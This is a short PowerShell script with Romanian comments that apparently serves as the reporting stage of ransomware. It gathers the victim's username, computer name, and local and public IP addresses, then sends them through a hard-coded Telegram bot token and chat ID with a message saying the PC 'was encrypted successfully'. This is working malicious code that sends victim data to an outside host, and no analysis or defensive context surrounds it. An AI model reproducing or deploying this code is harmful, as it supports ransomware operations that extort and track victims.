# INFO sistem
$user = $env:USERNAME
$pc = $env:COMPUTERNAME

# IP local
$localIp = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress

# IP public
try {
    $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
} catch {
    $publicIp = "n/a"
}

# Mesaj final
$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $localIp | $publicIp"

# Trimite pe Telegram
$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
$body = @{
    'chat_id' = '656189986'
    'text'    = $message
} | ConvertTo-Json -Compress

try {
    Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
} catch {}
